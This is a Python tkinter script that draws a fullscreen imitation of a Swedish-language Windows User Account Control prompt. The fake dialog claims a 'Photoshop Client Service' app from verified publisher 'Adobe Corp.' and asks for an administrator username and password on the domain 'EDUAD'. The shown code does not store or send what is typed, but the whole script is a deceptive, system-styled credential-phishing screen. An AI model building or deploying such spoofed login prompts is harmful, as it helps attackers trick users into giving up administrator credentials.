from tkinter import *
from PIL import Image, ImageTk
import tkinter as tk
import time

# Create a Tkinter window
root = Tk()
root.attributes("-fullscreen", True)  # Set window to full screen

# Load image and create a background canvas to display it
image_bg = Image.open("ante - cbt.jpg")
width, height = root.winfo_screenwidth(), root.winfo_screenheight()
image_bg = image_bg.resize((width, height))
photo_bg = ImageTk.PhotoImage(image_bg)
canvas_bg = Canvas(root, width=width, height=height, borderwidth=0, highlightthickness=0)
canvas_bg.create_image(0, 0, image=photo_bg, anchor=NW)
canvas_bg.pack(fill=BOTH, expand=YES)

# Add darker blue square
blue_squar = Canvas(root, width=462, height=502, bg='#0678F7', highlightthickness=0)
blue_squar.place(relx=0.5, rely=0.55, anchor=CENTER)

def longer_blue_squar():
    blue_squares = Canvas(root, width=462, height=42, bg='#55b0dd', highlightthickness=0)
    blue_squares.place(relx=0.5, rely=0.901, anchor=CENTER)

# Add a gray square at the center of the image
squar = Canvas(root, width=460, height=500, bg='#282828', highlightthickness=0)
squar.place(relx=0.5, rely=0.55, anchor=CENTER)

def longer_squar():
    squares = Canvas(root, width=460, height=40, bg='#282828', highlightthickness=0)
    squares.place(relx=0.5, rely=0.9, anchor=CENTER)

# Add blue top bar
bar = Canvas(squar, width=460, height=95, bg='#80bceb', highlightthickness=0)
bar.place(relx=0.5, rely=0, anchor=N)

# Add the "User Account Control" label
label = Label(root, text="User Account Control", font=("Segoe UI", 9), fg="black", bg='#80bceb')
label.place(x=475, y=175)

# Add the "Tillåter du att den här appen får göra" label
label = Label(root, text="Tillåter du att den här appen får göra", font=("Segoe UI", 14), fg="black", bg='#80bceb')
label.place(x=475, y=200)

# Add the "ändringar på enheten?" label
label = Label(root, text="ändringar på enheten?", font=("Segoe UI", 14), fg="black", bg='#80bceb')
label.place(x=475, y=228)

# Load image and create a label to display it
image = Image.open("Ps - kopia.png")
image = image.resize((50, 50))
photo = ImageTk.PhotoImage(image)
label = Label(root, image=photo, borderwidth=0, highlightthickness=0)
label.place(x=475, y=285)

# Add the "Photoshop Client Service" label
label = Label(root, text="Photoshop Client Service", font=("system fallback", 14), fg='#E4e4e4', bg='#282828')
label.place(x=530, y=295)

# Add the "Verifierad utgivare: Adobe Corp." label
label = Label(root, text="Verifierad utgivare: Adobe Corp.", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=350)

# Add the "Filens ursprung: Hårddisk på den här datorn" label
label = Label(root, text="Filens ursprung: Hårddisk på den här datorn", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=372)

# Create a label for the "Visa mer information" text
access_account_label = Label(root, text="Visa mer information", font=("Segoe UI", 9), bg="#282828", fg="#0078D7")
access_account_label.place(x=475, y=415)

# Change font color property on hover
def on_enter(e):
    access_account_label.config(fg="#8E8E8E", font=("Segoe UI", 9), cursor="hand2")

def on_leave(e):
    access_account_label.config(fg="#0078D7", font=("Segoe UI", 9), cursor="arrow")

access_account_label.bind("<Enter>", on_enter)
access_account_label.bind("<Leave>", on_leave)

# Add the "Ange ett administratöranvändarnamn
label = Label(root, text="Ange ett administratöranvändarnamn och -lösenord för att", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=450)

# Add the "fortsätta." label
label = Label(root, text="fortsätta.", font=("system fallback", 11), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=470)

def focus_on_username_entry(event):
    username_entry.focus()

def focus_on_password_entry(event):
    password_entry.focus()

# Add the "användarnamn" label
användarnamn_label = Label(root, text="användarnamn", font=("system fallback", 11), fg="#646464", bg='#181818', cursor="xterm")
användarnamn_label.place(x=478, y=503)
användarnamn_label.bind("<Button-1>", focus_on_username_entry)
användarnamn_label.config(takefocus=True)

# Add the "lösenord" label
lösenord_label = Label(root, text="lösenord", font=("system fallback", 11), fg="#646464", bg='#181818', cursor="xterm")
lösenord_label.place(x=478, y=543)
lösenord_label.bind("<Button-1>", focus_on_password_entry)
lösenord_label.config(takefocus=True)

def on_focus_out(event):
    username_entry.config(bg="#181818", highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
    användarnamn_label.config(bg="#181818", fg="#646464")

def on_focus_in(event):
    username_entry.config(bg="#fcfdff", highlightthickness=1, highlightcolor="#1da8e9", highlightbackground="#1da8e9")
    användarnamn_label.config(bg="#fcfdff", fg="#CECECE")

def on_key_press(event):
    # Only show the image if the password field has focus
    if len(username_entry.get()) > 0:
        användarnamn_label.place(x=5000, y=5000)
    else:
        användarnamn_label.place(x=478, y=503)

def on_click(event):
    # Set focus to username entry field if clicked on användarnamn label
    if event.widget == användarnamn_label:
        username_entry.focus()
    
    # Set focus to password entry field if clicked on lösenord label
    elif event.widget == lösenord_label:
        password_entry.focus()
    
    # Remove focus from entry fields if clicked outside them
    elif event.widget not in (username_entry, password_entry, lbl_eye):
        root.focus()

    # Set focus to the password entry field if eye icon is clicked
    elif event.widget == lbl_eye:
        password_entry.focus()

# Create an entry field for the password
username_entry = Entry(root, width=30, font=("Segoe UI", 14), bg="#181818", fg="black", bd=0, highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
username_entry.place(x=475, y=500)

# Bind the focus events to the entry field
username_entry.bind("<FocusIn>", on_focus_in)
username_entry.bind("<FocusOut>", on_focus_out)

# Bind the key event to the root window
root.bind_all("<Key>", on_key_press)

# Bind click event to root window
root.bind("<Button-1>", on_click)

def on_focus_out(event):
    password_entry.config(bg="#181818", highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
    lbl_eye.place(x=5000, y=5000)
    lösenord_label.config(bg="#181818", fg="#646464")

def on_focus_in(event):
    password_entry.config(bg="#fcfdff", highlightthickness=1, highlightcolor="#1da8e9", highlightbackground="#1da8e9")
    on_key_press(None)  # Call on_key_press function to show/hide the image
    lösenord_label.config(bg="#fcfdff", fg="#CECECE")
    

def on_key_press(event):
    # Show lösenord_label if password field has text in it
    if len(password_entry.get()) > 0:
        lösenord_label.place(x=5000, y=5000)
    else:
        lösenord_label.place(x=478, y=543)

    # Show lbl_eye if password field has text and focus is on the password field
    if password_entry == root.focus_get() and len(password_entry.get()) > 0:
        lbl_eye.place(x=751, y=541)
    else:
        lbl_eye.place(x=5000, y=5000)

def on_click(event):
    # Set focus to username entry field if clicked on användarnamn label
    if event.widget == användarnamn_label:
        username_entry.focus()
    
    # Set focus to password entry field if clicked on lösenord label
    elif event.widget == lösenord_label:
        password_entry.focus()
    
    # Remove focus from entry fields if clicked outside them
    elif event.widget not in (username_entry, password_entry, lbl_eye):
        root.focus()

    # Set focus to the password entry field if eye icon is clicked
    elif event.widget == lbl_eye:
        password_entry.focus()

# Create an entry field for the password
password_entry = Entry(root, width=30, font=("Segoe UI", 14), bg="#181818", fg="black", show="●", bd=0, highlightthickness=1, highlightcolor="#646464", highlightbackground="#646464")
password_entry.place(x=475, y=540)

# Bind the focus events to the entry field
password_entry.bind("<FocusIn>", on_focus_in)
password_entry.bind("<FocusOut>", on_focus_out)

# Bind the key event to the root window
root.bind("<Key>", on_key_press)

# Bind click event to root window
root.bind("<Button-1>", on_click)

# Load the image
img_eye = Image.open("eye.png").resize((17, 17), resample=Image.LANCZOS)
img_eye_tk = ImageTk.PhotoImage(img_eye)

# Create a Label with the initial image
lbl_eye = tk.Label(root, image=img_eye_tk, highlightthickness=5, borderwidth=0, highlightbackground="#fcfdff")
lbl_eye.place(x=751, y=541)

# Define the hover and click actions
def on_hover(event):
    img_blue_eye = Image.open("blueeye.png").resize((17, 17), resample=Image.LANCZOS)
    img_blue_eye_tk = ImageTk.PhotoImage(img_blue_eye)
    lbl_eye.config(image=img_blue_eye_tk)
    lbl_eye.image = img_blue_eye_tk  # Save a reference to avoid garbage collection

def on_click(event):
    img_eye_blue = Image.open("eyeblue.png").resize((17, 17), resample=Image.LANCZOS)
    img_eye_blue_tk = ImageTk.PhotoImage(img_eye_blue)
    lbl_eye.config(image=img_eye_blue_tk, highlightbackground="#0078d7")
    lbl_eye.image = img_eye_blue_tk  # Save a reference to avoid garbage collection
    password_entry.configure(show="")

def on_release(event):
    img_blue_eye = Image.open("blueeye.png").resize((17, 17), resample=Image.LANCZOS)
    img_blue_eye_tk = ImageTk.PhotoImage(img_blue_eye)
    lbl_eye.config(image=img_blue_eye_tk, highlightbackground="#fcfdff")
    lbl_eye.image = img_blue_eye_tk  # Save a reference to avoid garbage collection
    password_entry.configure(show="●")

# Bind the actions to the Label
lbl_eye.bind("<Enter>", on_hover)
lbl_eye.bind("<Leave>", lambda event: lbl_eye.config(image=img_eye_tk))
lbl_eye.bind("<Button-1>", on_click)
lbl_eye.bind("<ButtonRelease-1>", on_release)

lbl_eye.place(x=5000, y=5000)

# Add the "Domän: EDUAD" label
label = Label(root, text="Domän: EDUAD", font=("system fallback", 10), fg="#E4e4e4", bg='#282828')
label.place(x=475, y=580)

def on_press(event):
    time.sleep(0.5)
    root.destroy()

def on_enter(event):
    nej_button_frame.config(highlightbackground="#909090")

def on_leave(event):
    nej_button_frame.config(highlightbackground="#4c4c4c")

# Make a button that says "Nej" on it
nej_button_frame = tk.Frame(root, highlightbackground="#4c4c4c", highlightthickness=3, bd=0)
nej_button = Button(nej_button_frame, text="Nej", width=28, height=1, pady=5, foreground="white", bg="#4c4c4c", bd=0, activebackground="#4c4c4c", highlightthickness=0)
nej_button.pack(fill="both", expand=True)
nej_button_frame.place(x=690, y=620)

nej_button.bind("<Enter>", on_enter)
nej_button.bind("<Leave>", on_leave)

nej_button.bind("<Button-1>", on_press)

def on_press(event):
    if len(username_entry.get()) == 0:
        show_label()
        longer_blue_squar()
        longer_squar()
        label.lift()
        ja_button_frame.place(x=475, y=655)
        nej_button_frame.place(x=690, y=655)
        ja_button_frame.lift()
        nej_button_frame.lift()
        label.place(x=475, y=610)
    else:
        if len(password_entry.get()) == 0:
            show_label()
            longer_blue_squar()
            longer_squar()
            label.lift()
            ja_button_frame.place(x=475, y=655)
            nej_button_frame.place(x=690, y=655)
            ja_button_frame.lift()
            nej_button_frame.lift()
            label.place(x=475, y=610)
        else:
            root.destroy()

def on_enter(event):
    ja_button_frame.config(highlightbackground="#909090")

def on_leave(event):
    ja_button_frame.config(highlightbackground="#4c4c4c")

# Make a button that says "Ja" on it
ja_button_frame = tk.Frame(root, highlightbackground="#4c4c4c", highlightthickness=3, bd=0)
ja_button = Button(ja_button_frame, text="Ja", width=28, height=1, pady=5, foreground="white", bg="#4c4c4c", bd=0, activebackground="#4c4c4c", highlightthickness=0)
ja_button.pack(fill="both", expand=True)
ja_button_frame.place(x=475, y=620)

ja_button.bind("<Enter>", on_enter)
ja_button.bind("<Leave>", on_leave)

ja_button.bind("<Button-1>", on_press)

# Change color property on hover
def on_enter(e):
    square.config(bg="red")
    square.itemconfig(line1, fill="white")
    square.itemconfig(line2, fill="white")

def on_click(e):
    root.destroy()

def on_leave(e):
    square.config(bg="#80bceb")
    square.itemconfig(line1, fill="black")
    square.itemconfig(line2, fill="black")

# Create the square
square = Canvas(root, width=27, height=30, bg='#80bceb', highlightthickness=0)
square.place(x=886, y=172)

# Draw "X" shape using two lines
line1 = square.create_line(9, 9, 21, 21, fill="black", width=1)
line2 = square.create_line(9, 21, 21, 9, fill="black", width=1)


square.bind("<Enter>", on_enter)
square.bind("<Leave>", on_leave)

square.bind("<Button-1>", on_click)

def show_label():
    label.place(x=475, y=670)

def hide_label():
    label.place_forget()

# Add the "Ange ett andvändarnamn och ett lösenord" label
label = Label(root, text="Ange ett andvändarnamn och ett lösenord", font=("system fallback", 11), fg="#Fff900", bg='#282828')
label.place(x=475, y=500)
hide_label()

# Add the "SWE" label
SWE = Label(root, text="SWE", font=("system fallback", 12, "bold"), fg="white", bg='#444444')
SWE.place(x=1250, y=700)

lösenord_label.lift()
användarnamn_label.lift()
username_entry.focus()

# Run the Tkinter event loop
root.mainloop()
